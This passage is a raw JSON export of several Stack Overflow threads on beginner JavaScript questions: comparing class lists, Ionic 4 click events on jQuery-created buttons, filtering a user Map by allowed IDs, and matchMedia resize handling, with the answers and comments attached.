"https://stackoverflow.com/users/1293709/thomas-hirsch"}, "is_accepted": false, "score": 0, "last_activity_date": 1558564386, "creation_date": 1558564386, "answer_id": 56265831, "question_id": 56265599, "link": "https://stackoverflow.com/questions/56265599/trying-to-compare-classes-of-different-elements/56265831#56265831", "title": "Trying to compare classes of different elements", "body": "<p>Taking the comments into account, this solves it independently of the order.\nChanged the example a bit, so it could be executed.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>//check for 2 matching squares\r\nfunction checkIfMatches() {\r\n\r\n  var elements = document.getElementsByClassName('card')\r\n  var first = elements[0].getElementsByTagName('i')[0]\r\n  var second = elements[1].getElementsByTagName('i')[0]\r\n  var matches = first.classList.length === second.classList.length\r\n  first.classList.forEach(entry =&gt; matches = matches &amp;&amp; second.classList.contains(entry))\r\n  console.log(matches)\r\n  \r\n  // matches ? disable() : unflip();\r\n\r\n}\r\n\r\ncheckIfMatches()</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;li class=\"card\"&gt;\r\n   &lt;i class=\"pa pa-test\"&gt;&lt;/i&gt;\r\n&lt;/li&gt;\r\n\r\n&lt;li class=\"card\"&gt;\r\n   &lt;i class=\"pa pa-test\"&gt;&lt;/i&gt;\r\n&lt;/li&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 201, "user_id": 9502385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a1b2f9e1faaefb4ecd1d4a3479f6091?s=128&d=identicon&r=PG&f=1", "display_name": "new_coder", "link": "https://stackoverflow.com/users/9502385/new-coder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1558564922, "creation_date": 1558562731, "question_id": 56265599, "link": "https://stackoverflow.com/questions/56265599/trying-to-compare-classes-of-different-elements", "title": "Trying to compare classes of different elements", "body": "<p>I'm looking to find a way to check if classes in an element matches those in another element. I have tried using code below: </p>\n\n<p>Using dataset seems to work, however, I'm looking to explore the possibility of doing this through pure Javascript. The line that works is commented out (var matches = first.dataset.name === second.dataset.name;) and the line that I'm having difficulty getting to work is (var matches = first.classList === second.classList;) </p>\n\n<p>javascript:</p>\n\n<pre><code>//check for 2 matching squares\nfunction checkIfMatches() {\n\n  //var matches = first.dataset.name === second.dataset.name;\n  var matches = first.classList === second.classList;\n  matches ? disable() : unflip();\n\n}\n</code></pre>\n\n<p>html:</p>\n\n<pre><code>&lt;li class=\"card\"&gt;\n   &lt;i class=\"pa pa-test\"&gt;&lt;/i&gt;\n&lt;/li&gt;\n\n&lt;li class=\"card\"&gt;\n   &lt;i class=\"pa pa-test\"&gt;&lt;/i&gt;\n&lt;/li&gt;\n</code></pre>\n\n<p>Thanks for any help. If more details are needed you can comment.</p>\n"}, {"tags": ["javascript", "jquery", "angular", "ionic-framework"], "answers": [{"comments": [{"owner": {"reputation": 99, "user_id": 4398338, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/796a4042e85f1c65d4d57a221931c1be?s=128&d=identicon&r=PG&f=1", "display_name": "Kamikaze Stifler", "link": "https://stackoverflow.com/users/4398338/kamikaze-stifler"}, "edited": false, "score": 0, "creation_date": 1560455252, "post_id": 56265763, "comment_id": 99753121, "body": "Yes , now i am using Angular and .. i&#39;m in love. thanks"}], "tags": [], "owner": {"reputation": 479, "user_id": 7386330, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2uU6Q.jpg?s=128&g=1", "display_name": "Ben Hulan", "link": "https://stackoverflow.com/users/7386330/ben-hulan"}, "is_accepted": false, "score": 0, "last_activity_date": 1558563873, "creation_date": 1558563873, "answer_id": 56265763, "question_id": 56265590, "link": "https://stackoverflow.com/questions/56265590/ionic-4-button-created-with-jquery-dont-call-event/56265763#56265763", "title": "Ionic 4 - Button created with Jquery dont call event", "body": "<p>It\u2019s better to avoid mixing jQuery with Angular for both style and performance. You might check out the <a href=\"https://forum.ionicframework.com/\" rel=\"nofollow noreferrer\">Ionic Forum</a> as a resource for Ionic-specific questions.</p>\n"}, {"comments": [{"owner": {"reputation": 99, "user_id": 4398338, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/796a4042e85f1c65d4d57a221931c1be?s=128&d=identicon&r=PG&f=1", "display_name": "Kamikaze Stifler", "link": "https://stackoverflow.com/users/4398338/kamikaze-stifler"}, "edited": false, "score": 0, "creation_date": 1558570993, "post_id": 56266006, "comment_id": 99149182, "body": "Thanks friend , like NgFor ?"}, {"owner": {"reputation": 36, "user_id": 10463652, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-G1_MP51hmGg/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DUyS1SNvXXZwZBTSAj2ppv9uPXXwA/mo/photo.jpg?sz=128", "display_name": "Fernando Garza", "link": "https://stackoverflow.com/users/10463652/fernando-garza"}, "reply_to_user": {"reputation": 99, "user_id": 4398338, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/796a4042e85f1c65d4d57a221931c1be?s=128&d=identicon&r=PG&f=1", "display_name": "Kamikaze Stifler", "link": "https://stackoverflow.com/users/4398338/kamikaze-stifler"}, "edited": false, "score": 0, "creation_date": 1558584820, "post_id": 56266006, "comment_id": 99151503, "body": "Yes, I don&#39;t know how explain you, but if you share more code I can help you more"}], "tags": [], "owner": {"reputation": 36, "user_id": 10463652, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-G1_MP51hmGg/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DUyS1SNvXXZwZBTSAj2ppv9uPXXwA/mo/photo.jpg?sz=128", "display_name": "Fernando Garza", "link": "https://stackoverflow.com/users/10463652/fernando-garza"}, "is_accepted": true, "score": 1, "last_activity_date": 1558565779, "creation_date": 1558565779, "answer_id": 56266006, "question_id": 56265590, "link": "https://stackoverflow.com/questions/56265590/ionic-4-button-created-with-jquery-dont-call-event/56266006#56266006", "title": "Ionic 4 - Button created with Jquery dont call event", "body": "<p>maybe the best way is create the button with an array iterator.\nWhen you do click on the first event, push in an array the ID for the next button, and in the view do the data iterator.\nI don't know if I explain.</p>\n"}], "owner": {"reputation": 99, "user_id": 4398338, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/796a4042e85f1c65d4d57a221931c1be?s=128&d=identicon&r=PG&f=1", "display_name": "Kamikaze Stifler", "link": "https://stackoverflow.com/users/4398338/kamikaze-stifler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 203, "favorite_count": 0, "accepted_answer_id": 56266006, "answer_count": 2, "score": 0, "last_activity_date": 1558565779, "creation_date": 1558562660, "question_id": 56265590, "link": "https://stackoverflow.com/questions/56265590/ionic-4-button-created-with-jquery-dont-call-event", "title": "Ionic 4 - Button created with Jquery dont call event", "body": "<p>I'm using Ionic 4 in my project, where I'm using with Jquery, on the html page I've created a button with the following code: </p>\n\n<p><code>&lt;ion-button (click)=\"event1()\"&gt;EVENT1 &lt; / ion-button&gt;</code></p>\n\n<p>in page .ts I created the function that performs an append inside a div, that is, every time I click on the event1 button a new input is created.</p>\n\n<pre><code>event1 () {\n//i remove the appends codes and bla bla bla\n&lt;div&gt; &lt;div&gt; &lt;/ div&gt; &lt;div id = \"goku\" (click) = \"event2 ()\" &lt;div class = &gt; &lt;/ ion-button&gt; &lt;/ div&gt;\n}\n</code></pre>\n\n<p>which works and creates the inputs with a button next to it.</p>\n\n<p>but when I click the button that came along with the input I should call event2</p>\n\n<p>in my .ts file below event1 I created the function</p>\n\n<pre><code>event2 () {\nalert ('Hi i am Goku')\n}\n</code></pre>\n\n<p>but no event is called, just as no error is displayed on the console.</p>\n\n<p>but if you create it manually in the html file, the  </p>\n\n<p>the event is called without problems.</p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 1, "creation_date": 1558562218, "post_id": 56265520, "comment_id": 99147335, "body": "use <code>map</code> for this, over your <code>allowedRoles</code> array and use <code>filter</code> on your user collection."}, {"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 2, "creation_date": 1558562289, "post_id": 56265520, "comment_id": 99147364, "body": "Start by describing <b>in words</b> each step to do this. Be as detailed as you can."}, {"owner": {"reputation": 10321, "user_id": 215552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26bda02894d869c95f620de4b7cd386d?s=128&d=identicon&r=PG", "display_name": "Heretic Monkey", "link": "https://stackoverflow.com/users/215552/heretic-monkey"}, "edited": false, "score": 0, "creation_date": 1558562948, "post_id": 56265520, "comment_id": 99147541, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/46894352/filtering-an-array-of-objects-based-on-another-array-in-javascript\">filtering an array of objects based on another array in javascript</a>"}], "answers": [{"tags": [], "owner": {"reputation": 26112, "user_id": 8526705, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/buwQ5.jpg?s=128&g=1", "display_name": "Dacre Denny", "link": "https://stackoverflow.com/users/8526705/dacre-denny"}, "is_accepted": false, "score": 0, "last_activity_date": 1558562799, "creation_date": 1558562799, "answer_id": 56265610, "question_id": 56265520, "link": "https://stackoverflow.com/questions/56265520/return-object-data-by-index-from-another-array/56265610#56265610", "title": "Return object data by index from another array", "body": "<p>If you have a map of users (ie <code>userMap</code>), and an array of <code>allowedRoles</code> that you want to filter users by, then a simple way to obtain this a new collection of users would be to:</p>\n\n<ol>\n<li>Iterate the key/value entries of the <code>userMap</code> and</li>\n<li>If the current entry key is present in the <code>allowedRoles</code> array, include the user value in the resulting array</li>\n</ol>\n\n<p>This can be expressed as:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const userMap = {\r\n '531592097837613058' : { user : \"bob\" },\r\n '460281004972572672' : { user : \"bill\" },\r\n '124' : { user : \"joe\" },\r\n '523928765865394211' : { user : \"sam\" }\r\n}\r\n\r\nconst allowedRoles = ['523928765865394211', '124'];\r\n\r\n\r\nconst allowedUsers = [];\r\n\r\n/* Iterate entries of user map */\r\nfor(const [key, value] of Object.entries(userMap)) {\r\n  \r\n  /* If key of user map present in allowed roles, add the value (user)\r\n  to allowed users */\r\n  if(allowedRoles.indexOf(key) !== -1) {\r\n    allowedUsers.push(value);\r\n  }\r\n}\r\n\r\nconsole.log(allowedUsers);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 274, "user_id": 3161860, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ylI2DEPh8us/AAAAAAAAAAI/AAAAAAAACKA/bLaPEpoyw7E/photo.jpg?sz=128", "display_name": "KoreanwGlasses", "link": "https://stackoverflow.com/users/3161860/koreanwglasses"}, "is_accepted": false, "score": 0, "last_activity_date": 1558562911, "creation_date": 1558562911, "answer_id": 56265625, "question_id": 56265520, "link": "https://stackoverflow.com/questions/56265520/return-object-data-by-index-from-another-array/56265625#56265625", "title": "Return object data by index from another array", "body": "<p>Assuming <code>users</code> is your dictionary/map of user ids, there are two ways to accomplish what you want:</p>\n\n<pre><code>// The functional way    \nresult = allowedRoles.map(id =&gt; users[id]).filter(userData =&gt; userData != undefined)\n\n// With loops\nresult = []\nfor(id of allowedRoles) {\n    if(users[id] != undefined) result.push(users[id])\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 73287, "user_id": 3874623, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6df0aa136ee42f4ea24ef08b7c348e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/3874623/mark"}, "is_accepted": false, "score": 0, "last_activity_date": 1558563024, "creation_date": 1558563024, "answer_id": 56265646, "question_id": 56265520, "link": "https://stackoverflow.com/questions/56265520/return-object-data-by-index-from-another-array/56265646#56265646", "title": "Return object data by index from another array", "body": "<p>If you know that all the ids in <code>allowedRoles</code> exist in the <code>Collection</code>, you can just map over <code>allowedRoles</code> and do the lookup. If it's possible other ids exist in <code>allowedRoles</code> filter them out first:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let Collection = new Map ([\r\n  ['531592097837613058', {name: \"Fred\"}],\r\n  ['523928765865394211', {name: \"Barney\"}]\r\n]);\r\n \r\n const allowedRoles = ['523928765865394211'];\r\n\r\n let roles = allowedRoles\r\n             //.filter(item =&gt; Collection.has(item)) // if you need it\r\n             .map(item =&gt; Collection.get(item))\r\n\r\n console.log(roles)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Because <code>Map</code> lookups are constant time, this should be O(n) where n is the length of <code>allowedRoles</code></p>\n"}], "owner": {"reputation": 224, "user_id": 8273185, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/32994a3a023697478f34f6640c7973ec?s=128&d=identicon&r=PG&f=1", "display_name": "webmasterdro", "link": "https://stackoverflow.com/users/8273185/webmasterdro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1558563265, "creation_date": 1558562120, "question_id": 56265520, "link": "https://stackoverflow.com/questions/56265520/return-object-data-by-index-from-another-array", "title": "Return object data by index from another array", "body": "<p>What's the best way to return data from an array if the index matches another array?</p>\n\n<p>I have a collection of users:</p>\n\n<pre><code>Collection [Map] {\n '531592097837613058' =&gt; {}\n '460281004972572672' =&gt; {}\n}\n</code></pre>\n\n<p>And I have array with allowed IDs: </p>\n\n<pre><code>const allowedRoles = ['523928765865394211'];\n</code></pre>\n\n<p>What I'd like to achieve, is return collection's object where the index matches some one of the indexs in AllowedRoles. In theory, it's quite simple, but I'm misunderstanding collection methods.</p>\n"}, {"tags": ["javascript", "css", "media-queries", "matchmedia"], "comments": [{"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558562894, "post_id": 56265514, "comment_id": 99147519, "body": "Try looking in your console log,  this -&gt; <code>x.addEventListener(adjustMenuDesign);</code> is invalid code."}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558563903, "post_id": 56265514, "comment_id": 99147784, "body": "Oh duh, Thanks @Keith. Couple questions though. Alert seems to work now, but it only alerts once? when I adjust the width back and forth below and above 1700px it doesn&#39;t keep alerting? Also I tried changing the color of the arrow on the image slider(I have this declared as a const already) and this didn&#39;t work?"}, {"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558564137, "post_id": 56265514, "comment_id": 99147831, "body": "You will want to check again on resize.  That&#39;s maybe what your <code>x.addEventListener(</code> was meant to do,..  I&#39;ll update your snippet here as an answer to show the changes."}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558564491, "post_id": 56265514, "comment_id": 99147924, "body": "Ok thanks I appreciate it"}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558565162, "post_id": 56265514, "comment_id": 99148074, "body": "Also I tried <code>window.addEventListener(&#39;onresize&#39;, adjustMenuDesign);</code> and <code>x.addEventListener(&#39;onresize&#39;, adjustMenuDesign);</code> and <code>window.addEventListener(&#39;resize&#39;, adjustMenuDesign);</code> and <code>x.addEventListener(&#39;resize&#39;, adjustMenuDesign);</code> none of these worked?"}, {"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558565487, "post_id": 56265514, "comment_id": 99148139, "body": "Check out the updated fiddle I done.."}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558566283, "post_id": 56265514, "comment_id": 99148316, "body": "Oh and Keith I got 2 more questions lol. 1. Why does the matchmedia need to be declared inside the function, why doesn&#39;t it work as a global? Also In my previous comment I wondered why I couldn&#39;t change the color to the right arrow on the image slider, well that variable was also a global so I brought it into the function and low and behold it changed colors? but it stays that color even when the width is higher than 1700px?"}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558566433, "post_id": 56265514, "comment_id": 99148342, "body": "Here&#39;s a fiddle <a href=\"https://jsfiddle.net/yat5ncmk/7/\" rel=\"nofollow noreferrer\">jsfiddle.net/yat5ncmk/7</a>"}, {"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558566909, "post_id": 56265514, "comment_id": 99148452, "body": "You never change it back, once you have set it to red it will stay.   I&#39;ve  done another update that changes it to back to white,.. Also  matchmedia doesn&#39;t have to be declared inside the function, I&#39;m just not a fan of globals, but you will need to run the check again..   Here is an updated fiddle -&gt; <a href=\"https://jsfiddle.net/1d5z62ab/\" rel=\"nofollow noreferrer\">jsfiddle.net/1d5z62ab</a>"}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558568341, "post_id": 56265514, "comment_id": 99148712, "body": "Oh I see. Thanks man its people like you that give self taught developers a chance. You have good one:)"}, {"owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "reply_to_user": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558579742, "post_id": 56265514, "comment_id": 99150658, "body": "Also do you think it would make any difference if I put anything in the else statement? If its only useful for switching back and forth what use would it have for someone viewing it on a smaller screen that less than 1700px and isn&#39;t even capable of going bigger?"}], "answers": [{"tags": [], "owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "is_accepted": true, "score": 1, "last_activity_date": 1558565151, "creation_date": 1558565151, "answer_id": 56265910, "question_id": 56265514, "link": "https://stackoverflow.com/questions/56265514/window-matchmediamax-width-1700px-does-not-work/56265910#56265910", "title": "window.matchMedia(&quot;(max-width: 1700px)&quot;); does not work?", "body": "<p>A couple of problems..</p>\n\n<pre><code>x.addEventListener(adjustMenuDesign);\n</code></pre>\n\n<p>Errors, because addEventListener expects an event and a callback.\nBut what you might have meant to do was add this to the resize event..</p>\n\n<pre><code>window.addEventListener(\"resize\", adjustMenuDesign);\n</code></pre>\n\n<p>Also you will want to run the <code>matchMedia</code> query again on resize, so moving that piece of code into the adjustMenuDesign would make sense here.</p>\n\n<p>Below is a working fiddle with these changes. </p>\n\n<p><a href=\"https://jsfiddle.net/veckopab/\" rel=\"nofollow noreferrer\">https://jsfiddle.net/veckopab/</a></p>\n"}], "owner": {"reputation": 129, "user_id": 10887830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4da00a93e383c4e02d96b9a9b82dee9?s=128&d=identicon&r=PG&f=1", "display_name": "spabsa", "link": "https://stackoverflow.com/users/10887830/spabsa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 423, "favorite_count": 0, "accepted_answer_id": 56265910, "answer_count": 1, "score": 1, "last_activity_date": 1558565151, "creation_date": 1558562079, "question_id": 56265514, "link": "https://stackoverflow.com/questions/56265514/window-matchmediamax-width-1700px-does-not-work", "title": "window.matchMedia(&quot;(max-width: 1700px)&quot;); does not work?", "body": "<p>Hey friends I'm trying to use <code>window.matchMedia(\"(max-width: 1700px)\")</code> to add some elements in the html when the page is 1700px or smaller. Right now I'mk just trying to test it by have  a function alert 'yo' to the screen. This doesn't work as well as other things I tried to change? Any ideas?</p>\n\n<p><a href=\"https://jsfiddle.net/yat5ncmk/6/\" rel=\"nofollow noreferrer\">https://jsfiddle.net/yat5ncmk/6/</a></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const ham = document.querySelector('.nav-box');\r\nconst menu = document.querySelector('.menu');\r\nconst menuClose = document.querySelector('#menu-close');\r\nconst leftArrow = document.querySelector('#left');\r\nconst rightArrow = document.querySelector('#right');\r\nconst img = document.querySelector('.image-slider');\r\nvar x = window.matchMedia(\"(max-width: 1700px)\");\r\nlet num = 1;\r\n\r\nx.addEventListener(adjustMenuDesign);\r\nadjustMenuDesign(x);\r\n\r\nham.addEventListener('click', function() {\r\n\tham.classList.add('ham-open');\r\n\tmenu.style.marginLeft = '50px';\r\n})\r\n\r\nmenuClose.addEventListener('click', function() {\r\n\tham.classList.remove('ham-open');\r\n\tmenu.style.marginLeft = '-700px';\r\n})\r\n\r\nleftArrow.addEventListener('click', function() {\r\n\tnum--;\r\n\tif(num &gt; 0) {\r\n\t\timg.style.backgroundImage = 'url(img/fam-' + num + '.jpeg)';\r\n\t\tconsole.log(num);\r\n\t\tconsole.log(img.style.backgroundImage);\r\n\t} else {\r\n\t\tnum = 4;\r\n\t\timg.style.backgroundImage = 'url(img/fam-' + num + '.jpeg)';\r\n\t}\r\n})\r\n\r\nrightArrow.addEventListener('click', function() {\r\n\tnum++;\r\n\tif(num &lt;= 4) {\r\n\t\timg.style.backgroundImage = 'url(img/fam-' + num + '.jpeg)';\r\n\t\tconsole.log(num);\r\n\t\tconsole.log(img.style.backgroundImage);\r\n\t} else {\r\n\t\tnum = 1;\r\n\t\timg.style.backgroundImage = 'url(img/fam-' + num + '.jpeg)';\r\n\t}\t\r\n})\r\n\r\nfunction adjustMenuDesign(width) {\r\n    if (width.matches) { // If media query matches\r\n\t    alert('yo');\r\n\t} \r\n}\r\n\r\nwindow.sr = ScrollReveal();\r\n\r\nsr.reveal('.logo-wrap', {\r\n\tduration: 2000\r\n});\r\n\r\nsr.reveal('.w1', {\r\n\tduration: 2000,\r\n\torigin: 'bottom'\r\n});\r\n\r\nsr.reveal('.w2', {\r\n\tduration: 3000,\r\n\torigin: 'bottom'\r\n});\r\n\r\nsr.reveal('.w3', {\r\n\tduration: 4000,\r\n\torigin: 'bottom'\r\n});\r\n\r\nsr.reveal('.hours-line-left', {\r\n\tduration: 1000,\r\n\torigin: 'left',\r\n\tdistance: '200px'\r\n});\r\n\r\nsr.reveal('.hours-line-right', {\r\n\tduration: 1000,\r\n\torigin: 'right',\r\n\tdistance: '200px'\r\n});\r\n\r\nsr.reveal('.contact-line', {\r\n\tduration: 1000,\r\n\torigin: 'bottom',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.burrito', {\r\n\tduration: 1000,\r\n\torigin: 'right',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.taco', {\r\n\tduration: 1000,\r\n\torigin: 'right',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.guac', {\r\n\tduration: 1000,\r\n\torigin: 'right',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.nachos', {\r\n\tduration: 1000,\r\n\torigin: 'bottom',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.hot', {\r\n\tduration: 1000,\r\n\torigin: 'left',\r\n\tdistance: '250px'\r\n});\r\n\r\nsr.reveal('.back-to-top', {\r\n\tduration: 1000,\r\n\torigin: 'bottom',\r\n});\r\n\r\nsr.reveal('.btp-arrow', {\r\n\tduration: 1500,\r\n\torigin: 'top',\r\n\tdistance: '250px'\r\n});</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["javascript", "php"], "comments": [{"owner": {"reputation": 14233, "user_id": 916000, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/eumU0.png?s=128&g=1", "display_name": "Taha Paksu", "link": "https://stackoverflow.com/users/916000/taha-paksu"}, "edited": false, "score": 2, "creation_date": 1558561690, "post_id": 56265415, "comment_id": 99147194, "body": "Oops, that&#39;s not the problem! You are not calling <code>calTotal</code> you are just defining it :)"}, {"owner": {"reputation": 133, "user_id": 11343547, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-RwEjH2fhIII/AAAAAAAAAAI/AAAAAAAAAK0/xWk5kvw6cek/photo.jpg?sz=128", "display_name": "Louis", "link": "https://stackoverflow.com/users/11343547/louis"}, "reply_to_user": {"reputation": 14233, "user_id": 916000, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/eumU0.png?s=128&g=1", "display_name": "Taha Paksu", "link": "https://stackoverflow.com/users/916000/taha-paksu"}, "edited": false, "score": 0, "creation_date": 1558561858, "post_id": 56265415, "comment_id": 99147232, "body": "How can i call it as soon as my script 